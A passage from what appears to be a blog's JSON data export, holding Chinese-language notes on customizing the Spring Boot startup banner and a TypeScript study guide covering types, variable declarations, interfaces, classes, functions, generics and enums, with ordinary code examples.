class=\"line\">AnsiBackground    <span class=\"comment\">// 用来设定字符的背景色</span></span><br><span class=\"line\">AnsiStyle         <span class=\"comment\">// 用来控制加粗、斜体、下划线等等。</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>可以加上文件版本号等</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$&#123;application.title&#125;                    <span class=\"comment\">// MANIFEST.MF文件中的应用名称</span></span><br><span class=\"line\"></span><br><span class=\"line\">$&#123;application.version&#125;                  <span class=\"comment\">//  这个是MANIFEST.MF文件中的版本号  </span></span><br><span class=\"line\"></span><br><span class=\"line\">$&#123;application.formatted-version&#125;        <span class=\"comment\">// 这个是上面的的版本号前面加v后上括号  </span></span><br><span class=\"line\"></span><br><span class=\"line\">$&#123;spring-boot.version&#125;                  <span class=\"comment\">// 这个是springboot的版本号  </span></span><br><span class=\"line\"></span><br><span class=\"line\">$&#123;spring-boot.formatted-version&#125;\t\t\t\t<span class=\"comment\">// 同上</span></span><br></pre></td></tr></table></figure></li>\n</ul>\n</li>\n<li><p>示例</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$&#123;AnsiColor.BRIGHT_MAGENTA&#125;</span></span><br><span class=\"line\">    ______       ___</span><br><span class=\"line\">    /\\__  _\\     /\\_ \\</span><br><span class=\"line\">    \\/_/\\ \\/     \\//\\ \\     ___   __  __     __       __  __    ___   __  __</span><br><span class=\"line\">    \\ \\ \\       \\ \\ \\   / __`\\/\\ \\/\\ \\  /<span class=\"string\">&#x27;__`\\    /\\ \\/\\ \\  / __`\\/\\ \\/\\ \\</span></span><br><span class=\"line\"><span class=\"string\">        \\_\\ \\__     \\_\\ \\_/\\ \\\\ \\ \\ \\_/ |/\\  __/    \\ \\ \\_\\ \\/\\ \\\\ \\ \\ \\_\\ \\ \\</span></span><br><span class=\"line\"><span class=\"string\">        /\\_____\\    /\\____\\ \\____/\\ \\___/ \\ \\____\\    \\/`____ \\ \\____/\\ \\____/</span></span><br><span class=\"line\"><span class=\"string\">        \\/_____/    \\/____/\\/___/  \\/__/   \\/____/     `/___/&gt; \\/___/  \\/___/</span></span><br><span class=\"line\"><span class=\"string\">                                                        /\\___/</span></span><br><span class=\"line\"><span class=\"string\">                                                        \\/__/</span></span><br><span class=\"line\"><span class=\"string\">                :: Spring Boot ::\t\t\t\t\t\t\t$&#123;spring-boot.version&#125;   </span></span><br></pre></td></tr></table></figure></li>\n</ol>\n","site":{"data":{}},"excerpt":"<p>Spring Boot 启动时，控制台输出的图案叫 _banner_，如下所示的 Spring 图案。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  .   ____          _            __ _ _</span><br><span class=\"line\"> /\\\\ / ___<span class=\"string\">&#x27;_ __ _ _(_)_ __  __ _ \\ \\ \\ \\</span></span><br><span class=\"line\"><span class=\"string\">( ( )\\___ | &#x27;</span>_ | <span class=\"string\">&#x27;_| | &#x27;</span>_ \\/ _` | \\ \\ \\ \\</span><br><span class=\"line\"> \\\\/  ___)| |_)| | | | | || (_| |  ) ) ) )</span><br><span class=\"line\">  <span class=\"string\">&#x27;  |____| .__|_| |_|_| |_\\__, | / / / /</span></span><br><span class=\"line\"><span class=\"string\"> =========|_|==============|___/=/_/_/_/</span></span><br><span class=\"line\"><span class=\"string\"> :: Spring Boot ::                (v2.5.0)</span></span><br></pre></td></tr></table></figure>","more":"<h1 id=\"最简单方式改写-banner-输出的图案\"><a href=\"#最简单方式改写-banner-输出的图案\" class=\"headerlink\" title=\"最简单方式改写 banner 输出的图案\"></a>最简单方式改写 banner 输出的图案</h1><ol>\n<li>在 src&#x2F;main&#x2F;resources 目录下新建 banner.txt</li>\n<li>在 banner.txt 上加上图案，可以在这个网站-<a href=\"http://patorjk.com/software/taag/\">一个 ASCII 图案网站</a>-上获得自己想要的 ASCII 图案</li>\n</ol>\n<p>这样在启动项目时控制台就可以打印出自己的图案了。</p>\n<p>也可以使用 jpg、png 甚至 gif，都命名为 banner。</p>\n<p>或者通过设置<code>banner.image.location</code>属性来作为 banner 信息，这些图片会被转换为有艺术感的 ASCII，并且打印在文本的顶部。</p>\n<h1 id=\"对-banner-做配置\"><a href=\"#对-banner-做配置\" class=\"headerlink\" title=\"对 banner 做配置\"></a>对 banner 做配置</h1><ol>\n<li><p>在启动类上设置</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">// SpringApplication.run(TestApplication.class, args);</span></span><br><span class=\"line\">    <span class=\"type\">SpringApplication</span> <span class=\"variable\">springApplication</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">SpringApplication</span>(TestApplication.class);</span><br><span class=\"line\">    springApplication.setBannerMode(Banner.Mode.CONSOLE);</span><br><span class=\"line\">    springApplication.run(args);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>在 properties 文件中做配置</p>\n<figure class=\"highlight properties\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 打印到控制台</span></span><br><span class=\"line\"><span class=\"attr\">spring.main.banner-mode</span>=<span class=\"string\">console</span></span><br><span class=\"line\"><span class=\"comment\"># 打印到日志文件</span></span><br><span class=\"line\"><span class=\"attr\">spring.main.banner-mode</span>=<span class=\"string\">log</span></span><br><span class=\"line\"><span class=\"comment\"># 不打印</span></span><br><span class=\"line\"><span class=\"attr\">spring.main.banner-mode</span>=<span class=\"string\">off</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>banner 配置解析</p>\n<ul>\n<li><p>模式</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">OFF\t\t\t\t\t<span class=\"comment\">// 关闭banner</span></span><br><span class=\"line\">CONSOLE\t\t\t<span class=\"comment\">// 在控制台输出banner图案</span></span><br><span class=\"line\">LOG\t\t\t\t\t<span class=\"comment\">// 应为在日志中打印图案，控制台也有</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>打印样式</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">AnsiColor         <span class=\"comment\">// 用来设定字符的前景色</span></span><br><span class=\"line\">AnsiBackground    <span class=\"comment\">// 用来设定字符的背景色</span></span><br><span class=\"line\">AnsiStyle         <span class=\"comment\">// 用来控制加粗、斜体、下划线等等。</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>可以加上文件版本号等</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$&#123;application.title&#125;                    <span class=\"comment\">// MANIFEST.MF文件中的应用名称</span></span><br><span class=\"line\"></span><br><span class=\"line\">$&#123;application.version&#125;                  <span class=\"comment\">//  这个是MANIFEST.MF文件中的版本号  </span></span><br><span class=\"line\"></span><br><span class=\"line\">$&#123;application.formatted-version&#125;        <span class=\"comment\">// 这个是上面的的版本号前面加v后上括号  </span></span><br><span class=\"line\"></span><br><span class=\"line\">$&#123;spring-boot.version&#125;                  <span class=\"comment\">// 这个是springboot的版本号  </span></span><br><span class=\"line\"></span><br><span class=\"line\">$&#123;spring-boot.formatted-version&#125;\t\t\t\t<span class=\"comment\">// 同上</span></span><br></pre></td></tr></table></figure></li>\n</ul>\n</li>\n<li><p>示例</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$&#123;AnsiColor.BRIGHT_MAGENTA&#125;</span></span><br><span class=\"line\">    ______       ___</span><br><span class=\"line\">    /\\__  _\\     /\\_ \\</span><br><span class=\"line\">    \\/_/\\ \\/     \\//\\ \\     ___   __  __     __       __  __    ___   __  __</span><br><span class=\"line\">    \\ \\ \\       \\ \\ \\   / __`\\/\\ \\/\\ \\  /<span class=\"string\">&#x27;__`\\    /\\ \\/\\ \\  / __`\\/\\ \\/\\ \\</span></span><br><span class=\"line\"><span class=\"string\">        \\_\\ \\__     \\_\\ \\_/\\ \\\\ \\ \\ \\_/ |/\\  __/    \\ \\ \\_\\ \\/\\ \\\\ \\ \\ \\_\\ \\ \\</span></span><br><span class=\"line\"><span class=\"string\">        /\\_____\\    /\\____\\ \\____/\\ \\___/ \\ \\____\\    \\/`____ \\ \\____/\\ \\____/</span></span><br><span class=\"line\"><span class=\"string\">        \\/_____/    \\/____/\\/___/  \\/__/   \\/____/     `/___/&gt; \\/___/  \\/___/</span></span><br><span class=\"line\"><span class=\"string\">                                                        /\\___/</span></span><br><span class=\"line\"><span class=\"string\">                                                        \\/__/</span></span><br><span class=\"line\"><span class=\"string\">                :: Spring Boot ::\t\t\t\t\t\t\t$&#123;spring-boot.version&#125;   </span></span><br></pre></td></tr></table></figure></li>\n</ol>"},{"title":"TypeScript学习记录","date":"2021-06-22T10:00:00.000Z","_content":"\n按照惯例，先上官方文档\n\n[TypeScript 中文手册](https://typescript.bootcss.com)\n\n<!--more-->\n\n# 基础类型\n\n## 数据类型\n\nTypeScript 支持与 JavaScript 几乎相同的数据类型，此外还提供了实用的枚举类型方便我们使用。\n\n- 布尔值 `boolean`\n- 浮点数 `number`\n  和 JavaScript 一样，TypeScript 里的所有数字都是浮点数\n- 字符串 `string`\n  双引号 `\"\"` 或单引号 `''` 表示，\n  还可使用模板字符串，它可以定义多行文本和内嵌表达式。 这种字符串是被反引号 `` ` `` 包围，并且以 `${ expr }` 这种形式嵌入表达式\n- 数组 `[]` 或数组泛型 `Array<元素类型>`\n- 元组 `Tuple`\n  元组类型允许表示一个已知元素数量和类型的数组，各元素的类型不必相同。\n- 枚举 `enum`\n  枚举类型提供的一个便利是你可以由枚举的值得到它的名字。\n- 任意值 `any`\n  有时候，我们会想要为那些在编程阶段还不清楚类型的变量指定一个类型。 这些值可能来自于动态的内容，比如来自用户输入或第三方代码库。 这种情况下，我们不希望类型检查器对这些值进行检查而是直接让它们通过编译阶段的检查。\n  Object 类型的变量只是允许你给它赋任意值 - 但是却不能够在它上面调用任意的方法，即便它真的有这些方法。\n- 空值 `void`\n  它表示没有任何类型\n- `null` 和 `undefined`\n  `null` 和 `undefined` 两者各自有自己的类型分别叫做 `null` 和 `undefined` 。\n  默认情况下 `null` 和 `undefined` 是所有类型的子类型。\n- `never`\n  表示的是那些永不存在的值的类型。\n  是任何类型的子类型，也可以赋值给任何类型；然而，没有类型是 `never` 的子类型或可以赋值给 `never` 类型（除了 `never` 本身之外）\n\n## 类型断言\n\n类型断言好比其它语言里的类型转换，但是不进行特殊的数据检查和解构。它没有运行时的影响，只是在编译阶段起作用。\n\n- “尖括号”语法 `<变量类型>变量值`\n- `as` 语法 `变量值 as 变量类型`\n\n两种形式是等价的，但当在 TypeScript 里使用 JSX 时，只有 as 语法断言是被允许的。\n\n# 变量声明\n\nlet 和 const 是 JavaScript 里相对较新的变量声明方式。 像我们之前提到过的，let 在很多方面与 var 是相似的，但是可以帮助大家避免在 JavaScript 里常见一些问题。 const 是对 let 的一个增强，它能阻止对一个变量再次赋值。\n\n## `var` 声明\n\n`var` 声明有奇怪的作用域规则，可以在包含它的函数，模块，命名空间或全局作用域内部任何位置被访问，包含它的代码块对此没有什么影响。有些人称此为 var 作用域或函数作用域。函数参数也使用函数作用域。\n\n文档中的例子：\n\n```typescript\nfunction f(shouldInitialize: boolean) {\n  if (shouldInitialize) {\n    var x = 10\n  }\n\n  return x\n}\n\nf(true) // returns '10'\nf(false) // returns 'undefined'\n```\n\n可能引发的错误：\n\n- 多次声明同一个变量并不会报错\n\n  ```typescript\n  // 里层的for循环会覆盖变量i，因为所有i都引用相同的函数作用域内的变量\n  function sumMatrix(matrix: number[][]) {\n    var sum = 0\n    for (var i = 0; i < matrix.length; i++) {\n      var currentRow = matrix[i]\n      for (var i = 0; i < currentRow.length; i++) {\n        sum += currentRow[i]\n      }\n    }\n    return sum\n  }\n  ```\n\n- 变量获取怪异\n\n  ```typescript\n  for (var i = 0; i < 10; i++) {\n    setTimeout(function () {\n      console.log(i)\n    }, 100 * i)\n  }\n  // 期望值： 0 1 2 3 4 5 6 7 8 9\n  // 实际值： 10 10 10 10 10 10 10 10 10 10\n  ```\n\n  `setTimeout` 在若干毫秒后执行一个函数，并且是在 `for` 循环结束后。 `for` 循环结束后，`i` 的值为 `10`。 所以当函数被调用的时候，它会打印出 `10`！\n\n  一个通常的解决方法是使用立即执行的函数表达式（IIFE）来捕获每次迭代时 i 的值：\n\n  ```typescript\n  for (var i = 0; i < 10; i++) {\n    // capture the current state of 'i'\n    // by invoking a function with its current value\n    ;(function (i) {\n      setTimeout(function () {\n        console.log(i)\n      }, 100 * i)\n    })(i)\n  }\n  // 参数i会覆盖for循环里的i，但是因为我们起了同样的名字，所以我们不用怎么改for循环体里的代码。\n  // 输出值： 0 1 2 3 4 5 6 7 8 9\n  ```\n\n## `let` 声明\n\n当用 `let` 声明一个变量，它使用的是词法作用域或块作用域。\n\n- 不同于使用 `var` 声明的变量那样可以在包含它们的函数外访问，块作用域变量在包含它们的块或 `for` 循环之外是不能访问的。\n\n- 拥有块级作用域的变量的另一个特点是，它们不能在被声明之前读或写。虽然这些变量始终“存在”于它们的作用域里，但在直到声明它的代码之前的区域都属于暂时性死区。\n\n- 但我们仍然可以在一个拥有块作用域变量被声明前获取它，只是我们不能在变量声明前去调用那个函数。\n\n使用 `var` 声明同名变量时，不管声明多少次，得到的只有 1 个对象。但 `let` 在一个作用域里的同名变量只能声明一次。\n\n## `const` 声明\n\n拥有与 `let` 声明相同的作用域规则，但给变量声明赋值后不能再重新赋值。\n\n`const` 声明的变量所引用的值是不可变的，但变量的内部状态是可以改变的。\n\nTypeScript 允许将对象的成员设置成只读。\n\n## 解构\n\n- 解构数组\n\n  ```typescript\n  // 相当于使用索引\n  let input = [1, 2]\n  let [first, second] = input\n  console.log(first) // outputs 1\n  console.log(second) // outputs 2\n\n  // 使用...语法创建剩余变量\n  let [first, ...rest] = [1, 2, 3, 4]\n  console.log(first) // outputs 1\n  console.log(rest) // outputs [ 2, 3, 4 ]\n\n  // swap variables\n  ;[first, second] = [second, first]\n  ```\n\n- 解构对象\n\n  ```typescript\n  let o = {\n    a: 'foo',\n    b: 12,\n    c: 'bar',\n  }\n  let { a, b } = o\n\n  // 可以用没有声明的赋值\n  ;({ a, b } = { a: 'baz', b: 101 })\n\n  // 使用...语法创建剩余变量\n  let { a, ...passthrough } = o\n  let total = passthrough.b + passthrough.c.length\n  ```\n\n- 属性重命名\n- 默认值\n\n  ```typescript\n  function keepWholeObject(wholeObject: { a: string; b?: number }) {\n    let { a, b = 1001 } = wholeObject\n  }\n  ```\n\n- 函数声明\n\n  ```typescript\n  // 指定默认值\n  // 首先，需要在默认值之前设置其格式。\n  // 其次，需要在解构属性上给予一个默认或可选的属性用来替换主初始化列表。\n  function f({ a, b = 0 } = { a: '' }): void {\n    // ...\n  }\n  f({ a: 'yes' }) // ok, default b = 0\n  f() // ok, default to {a: \"\"}, which then defaults b = 0\n  f({}) // error, 'a' is required if you supply an argument\n\n  // 解构表达式要尽量保持小而简单\n  ```\n\n## 展开\n\n展开操作符正与解构相反。它允许你将一个数组展开为另一个数组，或将一个对象展开为另一个对象。\n\n```typescript\n// 解构数组\nlet first = [1, 2]\nlet second = [3, 4]\nlet bothPlus = [0, ...first, ...second, 5] // bothPlus = [0, 1, 2, 3, 4, 5]\n\n// 解构对象\nlet defaults = { food: 'spicy', price: '$$', ambiance: 'noisy' }\nlet search = { ...defaults, food: 'rich' } // search = { food: \"rich\", price: \"$$\", ambiance: \"noisy\" }\n```\n\n**注意**\n\n- 对象的展开比数组的展开要复杂的多。像数组展开一样，它是从左至右进行处理，但结果仍为对象。这就意味着出现在展开对象后面的属性会覆盖前面的属性。\n- 对象展开仅包含对象自身的可枚举属性。展开一个对象实例时，会丢失其方法。\n- TypeScript 编译器不允许展开泛型函数上的类型参数。\n\n# 接口 - interface\n\nTypeScript 的核心原则之一是对值所具有的结构进行类型检查。它有时被称做“鸭式辨型法”或“结构性子类型化”。\n\n在 TypeScript 里，接口的作用就是为这些类型命名和为你的代码或第三方代码定义契约。\n\n在调用函数时，传入的对象参数实际上会包含很多属性，但是编译器只会检查那些必需的属性是否存在，并且其类型是否匹配。\n\n## 可选属性\n\n带有可选属性的接口与普通的接口定义差不多，只是在可选属性名字定义的后面加一个 `?` 符号。\n\n可选属性的好处之一是可以对可能存在的属性进行预定义，好处之二是可以捕获引用了不存在的属性时的错误。\n\n## 只读属性\n\n可以在属性名前用 readonly 来指定只读属性。满足对象创建后不能修改属性值的限制。\n\nTypeScript 具有 `ReadonlyArray<T>` 类型，它与 `Array<T>` 相似，只是把所有可变方法去掉了，因此可以确保数组创建后再也不能被修改。\n\n```typescript\nlet a: number[] = [1, 2, 3, 4]\nlet ro: ReadonlyArray<number> = a\nro[0] = 12 // error!\nro.push(5) // error!\nro.length = 100 // error!\na = ro // error!\n\n// 不过可以用类型断言重写\na = ro as number[]\n```\n\n最简单判断该用 readonly 还是 const 的方法是看要把它做为变量使用还是做为一个属性。\n\n做为变量使用的话用 const，若做为属性则使用 readonly。\n\n## 额外的属性检查\n\n对象字面量会被特殊对待而且会经过额外属性检查，当将它们赋值给变量或作为参数传递的时候。如果一个对象字面量存在任何“目标类型”不包含的属性时，你会得到一个错误。\n\n```typescript\ninterface SquareConfig {\n  color?: string\n  width?: number\n}\n\nfunction createSquare(config: SquareConfig): { color: string; area: number } {\n  // ...\n}\n\n// error: 'colour' not expected in type 'SquareConfig'\nlet mySquare = createSquare({ colour: 'red', width: 100 })\n```\n\n绕开这些检查非常简单。最简便的方法是使用类型断言。但最佳的方式是能够添加一个字符串索引签名。最后一种跳过这些检查的方式是将这个对象赋值给一个另一个变量。\n\n```typescript\n// as断言\nlet mySquare = createSquare({ width: 100, opacity: 0.5 } as SquareConfig)\n\n// 如果SquareConfig带有上面定义的类型的color和width属性，并且还会带有任意数量的其它属性，那么我们可以这样定义它\ninterface SquareConfig {\n  color?: string\n  width?: number\n  [propName: string]: any\n}\n\n// 因为squareOptions不会经过额外属性检查，所以编译器不会报错\nlet squareOptions = { colour: 'red', width: 100 }\nlet mySquare = createSquare(squareOptions)\n```\n\n## 函数类型\n\n为了使用接口表示函数类型，我们需要给接口定义一个调用签名。它就像是一个只有参数列表和返回值类型的函数定义。参数列表里的每个参数都需要名字和类型。\n\n对于函数类型的类型检查来说，函数的参数名不需要与接口里定义的名字相匹配。TypeScript 编译器会要求对应位置上的参数类型是兼容的，如果不指定类型，TypeScript 的类型系统会推断出参数类型。\n\n## 可索引的类型\n\n可索引类型具有一个索引签名，它描述了对象索引的类型，还有相应的索引返回值类型。\n\n支持两种索引签名：字符串和数字。 可以同时使用两种类型的索引，但是数字索引的返回值必须是字符串索引返回值类型的子类型。\n\n```typescript\nclass Animal {\n  name: string\n}\nclass Dog extends Animal {\n  breed: string\n}\n\n// 错误：使用'string'索引，有时会得到Animal!\ninterface NotOkay {\n  [x: number]: Animal\n  [x: string]: Dog\n}\n```\n\n字符串索引签名能够很好的描述 `dictionary` 模式，并且它们也会确保所有属性与其返回值类型相匹配。\n\n可以将索引签名设置为只读，这样就防止了给索引赋值。\n\n## 类类型\n\n### `implements` 实现接口\n\n与 C# 或 Java 里接口的基本作用一样，TypeScript 也能够用它来明确的强制一个类去符合某种契约。\n\n也可以在接口中描述一个方法，在类里实现它。接口描述了类的公共部分，而不是公共和私有两部分。它不会帮你检查类是否具有某些私有成员。\n\n### 类静态部分与实例部分的区别\n\n类是具有两个类型的：静态部分的类型和实例的类型。\n\n当一个类实现了一个接口时，只对其实例部分进行类型检查。 constructor 存在于类的静态部分，所以不在检查的范围内。因此，我们应该直接操作类的静态部分。\n\n### `extends` 继承接口\n\n和类一样，接口也可以相互继承。这让我们能够从一个接口里复制成员到另一个接口里，可以更灵活地将接口分割到可重用的模块里，并通过继承多个接口创建合成接口。\n\n## 混合类型\n\n> 不懂\n\n一个例子就是，一个对象可以同时做为函数和对象使用，并带有额外的属性。\n\n```typescript\ninterface Counter {\n  (start: number): string\n  interval: number\n  reset(): void\n}\n\nfunction getCounter(): Counter {\n  let counter = <Counter>function (start: number) {}\n  counter.interval = 123\n  counter.reset = function () {}\n  return counter\n}\n\nlet c = getCounter()\nc(10)\nc.reset()\nc.interval = 5.0\n```\n\n## 接口继承类\n\n当接口继承了一个类类型时，它会继承类的成员但不包括其实现。\n\n接口同样会继承到类的 private 和 protected 成员。 这意味着当你创建了一个接口继承了一个拥有私有或受保护的成员的类时，这个接口类型只能被这个类或其子类所实现（implement）。\n\n# 类\n\n## 继承\n\n类从基类中继承了属性和方法。派生类通常被称作子类，基类通常被称作超类。\n\n派生类在自己的构造函数里必须调用 super()，即基类的构造函数。且访问 this 的属性之前，一定要调用 super()。\n\n## 公共，私有与受保护的修饰符\n\n### `public`\n\n在 TypeScript 里，成员都默认为 `public`\n\n### `private`\n\n不能在声明它的类的外部访问 `private` 成员。\n\n### `protected`\n\n`protected` 成员在派生类中仍然可以访问。\n\n### `readonly` 修饰符\n\n可以使用 `readonly` 关键字将属性设置为只读的。只读属性必须在声明时或构造函数里被初始化。\n\n## 存取器\n\nTypeScript 支持通过 getters/setters 来截取对对象成员的访问。它能帮助你有效的控制对对象成员的访问。\n\n- 存取器要求你将编译器设置为输出 ECMAScript 5 或更高。不支持降级到 ECMAScript 3\n- 只带有 `get` 不带有 `set` 的存取器自动被推断为 `readonly` 。\n\n## 静态属性\n\n用 `static` 定义，这些属性存在于类本身上面而不是类的实例上。\n\n## 抽象类\n\n不同于接口，抽象类可以包含成员的实现细节。 `abstract` 关键字是用于定义抽象类和在抽象类内部定义抽象方法。\n\n抽象类中的抽象方法不包含具体实现并且必须在派生类中实现。\n\n抽象方法必须包含 abstract 关键字并且可以包含访问修饰符。\n\n# 函数 - function\n\n> 在 JavaScript 里，函数可以使用函数体外部的变量。当函数这么做时，我们说它‘捕获’了这些变量。\n> 函数中使用的捕获变量不会体现在类型里。 实际上，这些变量是函数的隐藏状态并不是组成 API 的一部分。\n\n## 函数类型\n\nTypeScript 能够根据返回语句自动推断出返回值类型。\n\n函数类型包含两部分：参数类型和返回值类型。当写出完整函数类型的时候，这两部分都是需要的。函数的类型只是由参数类型和返回值组成的。\n\n- 我们以参数列表的形式写出参数类型，为每个参数指定一个名字和类型。只要参数类型是匹配的，那么就认为它是有效的函数类型，而不在乎参数名是否正确。\n- 对于返回值，我们在函数和返回值类型之前使用(=>)符号，如果函数没有返回任何值，也必须指定返回值类型为 void 而不能留空。\n\n## 函数参数\n\n### 可选参数和默认参数\n\nTypeScript 里的每个函数参数都是必须的。 这是指编译器检查用户是否为每个参数都传入了值，传递给一个函数的参数个数必须与函数期望的参数个数一致。\n\n- JavaScript 里，每个参数都是可选的，可传可不传。 没传参的时候，它的值就是 undefined。\n- 在 TypeScript 里我们可以在参数名旁使用?实现可选参数的功能。可选参数必须跟在必须参数后面。\n\n在 TypeScript 里，我们也可以为参数提供一个默认值当用户没有传递这个参数或传递的值是 undefined 时。 它们叫做有默认初始化值的参数。\n\n与普通可选参数不同的是，带默认值的参数不需要放在必须参数的后面。 如果带默认值的参数出现在必须参数前面，用户必须明确的传入 undefined 值来获得默认值。\n\n### 剩余参数\n\n在 JavaScript 里，你可以使用 arguments 来访问所有传入的参数。\n\n在 TypeScript 里，你可以把所有参数收集到一个变量里，剩余参数会被当做个数不限的可选参数。可以一个都没有，同样也可以有任意个。编译器创建参数数组，名字是你在省略号（...）后面给定的名字，你可以在函数体内使用这个数组。\n\n```typescript\nfunction buildName(firstName: string, ...restOfName: string[]) {\n  return firstName + ' ' + restOfName.join(' ')\n}\n\nlet employeeName = buildName('Joseph', 'Samuel', 'Lucas', 'MacKinzie')\n\nlet buildNameFun: (fname: string, ...rest: string[]) => string = buildName\n```\n\n## `this`\n\nJavaScript 里，`this` 的值在函数被调用的时候才会指定。\n\n当回调函数被调用时，它会被当成一个普通函数调用，`this` 将为 `undefined`，可以通过 `this` 参数来避免错误。\n\n## 重载\n\n为同一个函数提供多个函数类型定义来进行函数重载。\n\n为了让编译器能够选择正确的检查类型，它与 JavaScript 里的处理流程相似。 它查找重载列表，尝试使用第一个重载定义。 如果匹配的话就使用这个。 因此，在定义重载的时候，一定要把最精确的定义放在最前面。\n\n# 泛型 - generic\n\n在像 C#和 Java 这样的语言中，可以使用泛型来创建可重用的组件，一个组件可以支持多种类型的数据。这样用户就可以以自己的数据类型来使用组件。\n\n无法创建泛型枚举和泛型命名空间。\n\nexample：\n\n```typescript\nfunction identity<T>(arg: T): T {\n  return arg\n}\n// 定义了泛型函数后，可以用两种方法使用\n// 第一种是，传入所有的参数，包含类型参数\nlet output = identity<string>('myString') // type of output will be 'string\n// 第二种，利用了类型推论 – 即编译器会根据传入的参数自动地帮助我们确定T的类型\nlet output = identity('myString') // type of output will be 'string'\n```\n\n泛型接口\n\n```typescript\ninterface GenericIdentityFn<T> {\n  (arg: T): T\n}\n\nfunction identity<T>(arg: T): T {\n  return arg\n}\n\nlet myIdentity: GenericIdentityFn<number> = identity\n```\n\n泛型类\n\n泛型类使用（<>）括起泛型类型，跟在类名后面。\n\n```typescript\nclass GenericNumber<T> {\n  zeroValue: T\n  add: (x: T, y: T) => T\n}\n\nlet myGenericNumber = new GenericNumber<number>()\nmyGenericNumber.zeroValue = 0\nmyGenericNumber.add = function (x, y) {\n  return x + y\n}\n```\n\n泛型约束\n\n```typescript\ninterface Lengthwise {\n  length: number\n}\n\nfunction loggingIdentity<T extends Lengthwise>(arg: T): T {\n  console.log(arg.length) // Now we know it has a .length property, so no more error\n  return arg\n}\n\nloggingIdentity(3) // Error, number doesn't have a .length property\n\nloggingIdentity({ length: 10, value: 3 }) // OK\n```\n\n在泛型约束中使用类型参数\n\n可以声明一个类型参数，且它被另一个类型参数所约束。\n\n```typescript\nfunction getProperty<T, K extends keyof T>(obj: T, key: K) {\n  return obj[key]\n}\n\nlet x = { a: 1, b: 2, c: 3, d: 4 }\n\ngetProperty(x, 'a') // okay\ngetProperty(x, 'm') // error: Argument of type 'm' isn't assignable to 'a' | 'b' | 'c' | 'd'.\n```\n\n在泛型里使用类类型\n\n在 TypeScript 使用泛型创建工厂函数时，需要引用构造函数的类类型。\n\n```typescript\nclass BeeKeeper {\n  hasMask: boolean\n}\n\nclass ZooKeeper {\n  nametag: string\n}\n\nclass Animal {\n  numLegs: number\n}\n\nclass Bee extends Animal {\n  keeper: BeeKeeper\n}\n\nclass Lion extends Animal {\n  keeper: ZooKeeper\n}\n\nfunction createInstance<A extends Animal>(c: new () => A): A {\n  return new c()\n}\n\ncreateInstance(Lion).keeper.nametag // typechecks!\ncreateInstance(Bee).keeper.hasMask // typechecks!\n```\n\n# 枚举 - enum\n\n使用枚举我们可以定义一些有名字的数字常量。枚举通过 `enum` 关键字来定义。\n\n枚举是在运行时真正存在的一个对象。其中一个原因是因为这样可以从枚举值到枚举名进行反向映射。生成的代码中，枚举类型被编译成一个对象，它包含双向映射（name -> value）和（value -> name）。 引用枚举成员总会生成一次属性访问并且永远不会内联。\n\n当访问枚举值时，为了避免生成多余的代码和间接引用，可以使用常数枚举，在 `enum` 关键字前使用 `const` 